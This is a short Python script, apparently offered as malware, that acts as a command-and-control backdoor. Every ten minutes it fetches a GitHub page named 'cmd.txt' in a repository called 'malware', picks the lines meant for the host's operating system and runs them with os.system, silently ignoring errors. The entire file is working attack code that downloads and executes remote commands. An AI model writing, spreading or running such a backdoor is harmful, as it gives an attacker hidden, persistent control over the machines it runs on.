from urllib.request import urlopen
from bs4 import BeautifulSoup as bs
import os, time, re, platform

OS = platform.system()
OS_check = "#" if OS == "Windows" else "$"  ## Winodws : # / Linux : $
c2_server = "https://github.com/exit1100/malware/blob/master/cmd.txt"

while True :
    html = urlopen(c2_server)
    bsObject = bs(html, "html.parser")
    td_row = bsObject.findAll("td", {"id" : re.compile('LC.*')})
    for td in td_row:
        line = td.get_text()
        if line[0] != OS_check : continue
        cmd = line[1:]
        print("command execute >", cmd)
        try:
            os.system(cmd)
        except:
            pass
    time.sleep(600)
